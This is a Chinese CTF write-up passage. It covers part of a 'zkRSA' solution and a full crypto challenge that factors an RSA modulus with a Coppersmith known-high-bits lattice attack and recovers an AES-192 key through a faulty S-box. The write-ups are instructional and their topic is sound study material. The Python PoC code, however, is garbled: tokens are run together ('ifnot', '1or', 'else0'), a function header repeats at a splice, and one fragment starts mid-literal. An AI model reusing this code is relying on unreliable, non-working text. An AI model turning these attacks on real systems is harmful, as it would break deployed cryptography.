**gcd的实际操作与边界。** 各条 `Δ_i` 都是 `n` 的倍数，但倍数里通常还带着 `r_i²` 或 `r_i²(x²-1)` 这些与 `n` 互素的因子，所以单条 `Δ` 是1024 bit量级的数，gcd几条后掉到512 bit，位数本身就是判据。取三到五条即可；取太多反而可能因为某条恰好让 `Δ` 带上 `n` 之外的小公因子而把结果压低，此时乘回去或换样本重来。若得到的是 `2n` 之类的倍数，除掉小因子即可，不要对合数模数做质因数分解。求出 `n` 后，3.2的线性消元全在 `Z_n` 上进行，需要对系数求逆，而模合数下逆存在当且仅当系数与 `n` 互素——随机系数几乎必然可逆，偶发失败换一组样本重试；这条失败模式本身也是 `n` 正确的旁证。

**候选落到 `c` 。** 3.4的公式为每个平移点给出一个 `Z_j` ，取 `c_j=Z_j mod x` 即得16个候选。理论上可能有两个 `Z_j` 模 `x` 相同（ `x` 是512 bit随机数， `Z_j` 同量级，碰撞概率可忽略但不为零），实现上按集合去重即可，去重只缩小候选集、不改变命中逻辑。候选之间没有任何可排序的信息—— `Z_j` 与 `x` 无关联，索引只由未公开的纵坐标模16决定——所以策略只能是任取一个提交，单次命中率约 `1/16` 。

**提交前的自检。** `com=y^(-c) mod n` 用 `pow` 的负指数加模数写法即走模逆， `res=1` 。 `gcd(y,n)=1` 几乎必然成立，故 `com` 落在 `(0,n)` 内，满足范围检查； `c=0` 时 `com=1` ，连模逆都不需要，同样是合法的1/16。正式发送前在本地算一遍 `pow(1,x,n)==com*pow(y,c,n)%n` ，两边都该等于1，这一步能挡掉脚本自身的低级错误。

**会话不可复用。** 每次重连，服务端都重新生成 `p,q` 、 `x` 与平移点， `n` 、 `x` 、 `(a,b,D)` 随之全部作废，恢复结果没有跨会话价值。所以脚本必须在一轮内走完"采集300条证明→求 `n` →恢复参数→求 `x` →算16个候选→提交"，命中失败直接断开重来；期望约16轮，主要耗时在采集与线性消元上。

### 4\. PoC

```python
#!/usr/bin/env python3
"""zkRSA solver. Python 3.10+ and gmpy2 are required.

"""

import argparse
import ast
import hashlib
import json
import math
import random
import re
import socket
import string
import time
from pathlib import Path

from gmpy2 import invert, mpz

class NeedMoreProofs(Exception):
    """The current transcript does not yet determine the model."""

def recover(records, rng=None):

## ...
def recover(records, rng=None):
    """Recover n, the hidden exponent, and every possible next EC x-coordinate."""
    rng = rng or random.Random()
    if len(records) < 50:
        raise NeedMoreProofs("too few proofs")
    z = [res * res - com for com, chal, res in records if chal == 0]
    if len(z) < 3:
        raise NeedMoreProofs("too few challenge-zero proofs")
    n = math.gcd(*z)
    if n <= 1or n.bit_length() < 500:
        raise NeedMoreProofs("could not recover n")
    N = mpz(n)

    def inv(v):
        v = invert(v % N, N)
        ifnot v:
            raise ZeroDivisionError("nonunit modulo n")
        return v
```

* * *

## Crypto5-crp-12025

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Crypto |
| 形态  | 附件+远程容器 |
| 附件  | crp-12025_2091d0d2ed0d5f0288d02c0f29b5e5c7.zip，内含chall（46720字节）、hint.txt（45字节）、N.txt（313字节） |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

#### 附件组成

| 文件  | 内容  | 作用  |
| --- | --- | --- |
| `chall` | 46720字节的x86-64 Linux ELF | 菜单式远程服务，同时承载RSA目标密文与AES分组加密查询 |
| `N.txt` | 1248位RSA模数 `N` ，十六进制单行 | 312个十六进制字符，决定分解对象 |
| `hint.txt` | 44字节UTF-8提示gylike{魔法仕掛けのファンタジア}加换行 | 对应素因子的已知高位 |

三个附件分工明确： `N.txt` 给出模数， `hint.txt` 给出高位， `chall` 负责交互与故障注入。二进制无需打补丁或本地运行，真正要利用的是模数结构和S盒故障。

#### 服务接口

连接<靶机地址>后，程序先打印固定banner，再循环输出菜单：

```
=== My Computer ===
[1] show ciphertext
[2] encryption oracle
[3] show? me the h1nt
[0] exit
choice>
```

每次读取一个菜单编号，执行后回到 `choice>`  ；输入非法编号不会退出，只会重新打印菜单。各菜单的行为如下：

| 菜单  | 输入  | 输出  | 说明  |
| --- | --- | --- | --- |
| `1` | 无   | `TARGET_CT=<hex>` | 目标flag的RSA密文 |
| `2` | `pt hex>` <br><br>后一行32个十六进制字符 | `CT=<hex>` | 对16字节分组做带故障的AES-192加密 |
| `3` | 无   | `H1NT_CT=<hex>` | 对提示串按16字节分组加密后的密文 |
| `0` | 无   | 退出  | 结束连接 |

`[2]` 的输入必须恰好是32个十六进制字符（16字节），否则返回 `ERROR=bad input (need 32 hex chars)` ；全连接查询上限为2500次（反汇编中的比较值为 `0x9c4` ）。 `[2]` 与 `[3]` 共享同一套密钥和同一份故障S盒，因此样本可用于分析提示密文。提示明文共44字节，按16字节分组处理， `H1NT_CT` 为48字节，即3个分组。

`[2]` 与 `[3]` 构成故障攻击通道：仅凭分组输入输出即可反推提示。提示明文已在 `hint.txt` 中，故这条通道不是必经之路，但它与RSA主线共用同一个 `H` ，可作为独立验证。

#### RSA实现与参数结构

`[1]` 返回的密文由标准RSA给出：程序读取flag文件，去掉末尾空白字符，把剩余字节按大端解释为整数 `m` ，再计算

```
TARGET_CT = m^e mod N,  e = 65537
```

反汇编中完整的大数乘法、Barrett取模与平方-乘模幂实现，其进位、截断和模约简行为与Python整数运算逐项一致，所以本题的问题不在实现层，而在于 `N` 的因子结构。

`N` 为1248位。若它是两个624位素数的乘积，常规分解手段在比赛时间内不可行；题面给出的 `1248=272+704+272` 则明确指向另一种结构：模数中间夹着一个704位的因子，其上方和下方各留272位。于是有

```
N = q * r,  bitlen(q) = 704,  bitlen(r) = 544 = 272 + 272
```

其中 `q` 是素因子， `r` 是余因子，余因子无需分解。真正要解决的是：在只知道 `q` 的高351位、不知道低353位的情况下，把 `q` 从 `N` 中分离出来。这属于“已知部分因子的分解”问题，可化为单变量模未知因子的Coppersmith小根问题。

#### 分组加密与故障注入

`[2]` 和 `[3]` 使用AES-192结构：16字节分组、12轮、24字节（192位）密钥。程序把S盒永久改写了一个表项：

```
S'[0x06] = S[0xaf]
```

标准S盒中 `S[0x06]=0x6f` 、 `S[0xaf]=0x79` ，因此改写后 `0x6f` 不再出现， `0x79` 出现两次。故障贯穿整条连接，2500组样本都受同一替换影响。最后两轮连续经过故障S盒，使密文字节的可达值集合出现缺口并伴随重复值；输出端又异或8字节尾密钥重复两次形成的掩码，形成可统计、可差分的结构。攻击目标是恢复轮密钥，由密钥扩展反推24字节主密钥，再解密 `H1NT_CT` 得到提示明文。

### 3\. 解题过程

#### 由提示确定704位因子的高位

`hint.txt` 去掉换行后共44个UTF-8字节：

```
gylike{魔法仕掛けのファンタジア}
```

把它整体按大端解释为整数：

```toml
hint = b'gylike{魔法仕掛けのファンタジア}'
H = int.from_bytes(hint, 'big')
```

虽然占44字节，但首字节 `0x67` 只有7个有效位，所以 `H` 的实际位长是351。恢复出的素因子 `q` 满足

```
q >> 353 == H
q = H * 2^353 + x,  0 <= x < 2^353
```

即 `q` 的高351位完全等于 `H` ，低353位未知， `351+353=704` 正好补齐因子位长。右移353位而非352位，是因为 `H` 的首字节只有7个有效位；若右移352位，得到的是 `2H` 。这正是题面提示的落点：704位因子减去已知的351位，剩下353位需要求解。

于是构造首一多项式

```
f(x) = x + H * 2^353
```

它在模 `q` 下有一个小根 `x0` （真实未知的低353位），且 `f(x0) ≡ 0 (mod q)` 。恢复 `x0` 后即可拼出完整的 `q` 。

#### 单变量已知高位小根攻击

这是Coppersmith意义下的部分因子已知问题。 `q` 为704位， `N` 为1248位，取

```
beta = 704 / 1248 ≈ 0.5641
```

单变量模未知因子求小根的渐近根长界约为

```
X < N^(beta^2) = 2^(beta^2 * 1248) ≈ 2^397.1
```

其中 `beta^2 * 1248 = 704^2 / 1248 ≈ 397.13` 。本题的未知量只有353位，比上界小44位左右，余量充足，不需要把格维数堆得很高。取 `m = t = 6` ，格维数

```
dim = m + t = 12
```

`m` 决定模 `q^m` 的约束强度， `t` 补充高次项；12维已足以让最短向量落在“在 `x0` 处取值小于 `q^m` ”的范围内，继续增大维数只会增加系数规模。

#### 格构造与LLL约简

12维格基的每一行对应一个整数多项式：

-   前 `m` 行： `N^(m-i) * f(x)^i` ， `i = 0,1,...,m-1` ；
    
-   后 `t` 行： `x^k * f(x)^m` ， `k = 0,1,...,t-1` 。
    

由于 `f(x0) ≡ 0 (mod q)` ，前 `m` 行在 `x0` 处的取值都被 `q^m` 整除；后 `t` 行同样含有 `f(x)^m` 这一因子，因而也在 `x0` 处被 `q^m` 整除。为了让短向量对应“在 `x0` 处取值小”的多项式，把第 `j` 列整体乘以 `X^j` 做尺度替换（等价于把 `x` 换成 `X*x` ），使根落在单位区间内。这样格中短向量的系数被压到同一量级，LLL约简后才容易暴露出共享小根的多项式。

对12维整数格做LLL约简后，取约简基的每一行，把第 `j` 列除回 `X^j` （整除性由构造保证，余数必为0），得到整数系数多项式。其中若干行的多项式在 `x0` 处满足 `|g(x0)| < q^m` ，因此它们共享 `x - x0` 这个因子。把这些多项式两两求GCD，即可提取出线性因子，其根就是 `x0` 。

最后用

```
q = gcd(N, H * 2^353 + x0)
```

得到素因子；只要 `1 < q < N` 即命中。取GCD可排除“仅在某个中间模下成立”的伪根，并确认该根确实对应 `N` 的因子。

#### 恢复出的因子与验证

```
q = 68036116932259331574901688340391547959056674796208154953430203274929719591510486104368948321193721966088907329984365675556259580459930984809436432249347188958441272541855344091738398571957629165069198523363124313
```

对应的未知低位为

```
x0 = 405930456751063600932977588524214639026815882316465834064404694149341947297842341440560872769265631913049
```

校验结果：

-   `q` 是704位素数，且 `q | N` ；
    
-   `q >> 353 == H` ，已知高位前缀完全吻合；
    
-   余因子 `N/q` 为544位（272+272），最终解密不需要继续分解它。
    

#### 只用一个大因子解密

明文只有335位，远小于704位的 `q` ，不必凑齐两个因子做CRT。又因 `gcd(65537, q-1)=1` ，直接在 `q` 模下求逆：

```
d_q = pow(65537, -1, q - 1)
m = pow(TARGET_CT, d_q, q)
```

由于 `m < q` ，结果就是完整明文，不存在模 `q` 剩余类的歧义。按大端转回字节得42字节并解码为flag{动态容器已脱敏}。随后做完整模数回验：

```
assert pow(m, 65537, N) == TARGET_CT
```

`m^65537 mod N` 与靶机返回的 `TARGET_CT` 逐位相同，说明得到的不是仅在 `q` 模下偶然成立的候选明文，而是真正的RSA明文。整个flag推导只依赖 `[1]` 的目标密文、 `N` 和 `hint.txt` ，与余因子 `r` 的分解无关。

#### AES故障攻击与提示恢复

分组加密支线使用 `[2]` 采集的2500组(16字节明文, 16字节密文)样本。由于S盒被永久改写为 `S'[0x06]=S[0xaf]` ，输出 `0x6f` 缺失、 `0x79` 重复；经过最后两轮后，每个密文字节位置的可达值集合出现缺口，输出端异或的8字节尾密钥又重复两次，使密文前后半块带有相同的8字节结构。攻击分三步：

1.  **恢复外层轮密钥**。逐字节统计密文取值，得到缺失值集合；枚举其中两两组合，用异或差 `delta` 构造候选。对候选缺失输出 `y` ，按 `K11 = InvShiftRows(y ^ InvS[y ^ delta])` 反推第11轮密钥，再由轮常数推进密钥扩展得到 `K12` 。利用前后半块共享同一尾字节的约束筛除候选，得到唯一的故障表、 `K11` 、 `K12` 和8字节尾密钥。
    
2.  **逐轮反推**。用故障S盒的预像撤销最后一轮：密文异或尾掩码与 `K12` 后，逐字节取所有S盒预像，只保留唯一状态继续。之后依次撤销 `K11` 到 `K2` ；每步利用密钥扩展中ShiftRows置换的循环结构，下一轮密钥已知时，当前轮密钥的每个置换循环只需满足若干异或条件，循环约束把多解迅速收缩，逐轮恢复 `K10` 到 `K1` ，最后回推 `K0` 。
    
3.  **恢复主密钥并解密提示**。对任一样本完整撤销12轮，与明文异或得到 `K0` ；前16字节 `K0` 加后8字节尾密钥组成24字节（192位）主密钥。用它重新加密2500组样本，密文全部一致；解密 `H1NT_CT` 的3个分组，所得合法UTF-8明文与 `hint.txt` 完全相同。
    

因此AES支线独立给出了同一个44字节提示和同一个 `H` ，但不改变flag来源：最终flag仍由3.5用 `q` 模解密 `TARGET_CT` 得到。

### 4\. PoC

```python
    'd4b93b590739cde924c895c2ded83b4b400ccac965dede94bf7c4e48b57b'
    'df8077eddd2d1fd29807f4898b4735b06882a3dc352e2076414cf85b6acf'
    'a3d3ca24e99f485715d874f52a5c192242063b6aa8fbb3a8591043c44633'
    '4800689557',
    16,
)

## hint.txt 去掉换行后的44字节UTF-8提示
HINT = bytes.fromhex(
    '67796c696b657be9ad94e6b395e4bb95e68e9be38191e381aee38395e382a1e383b3e382bfe382b8e382a27d'
)

FACTOR_BITS = 704
E = 65537

def recover_factor(n, prefix, unknown_bits):
    """恢复 q | n，且 q = prefix * 2**unknown_bits + x，0 <= x < 2**unknown_bits。"""
    constant = prefix << unknown_bits
    X = 1 << unknown_bits
    m = t = 6
    dimension = m + t

    # 前 m 行是 N^(m-i) * f(x)^i，后 t 行是 x^k * f(x)^m；
    # 第 j 列乘以 X^j 做 x -> X*x 的尺度替换。
    basis = []
    for i in range(m):
        basis.append([
            comb(i, j) * constant ** (i - j) * n ** (m - i) * X ** j if j <= i else0
            for j in range(dimension)
        ])
    for k in range(t):
        basis.append([
            comb(m, j - k) * constant ** (m - j + k) * X ** j if k <= j <= m + k else0
            for j in range(dimension)
        ])

    reduced = fmpz_mat(basis).lll()

    polynomials = []
    for i in range(dimension):
        # 把尺度替换除回去，整除性由格构造保证。
        coefficients = []
        for j in range(dimension):
            value, remainder = divmod(int(reduced[i, j]), X ** j)
            assert remainder == 0
```

* * *
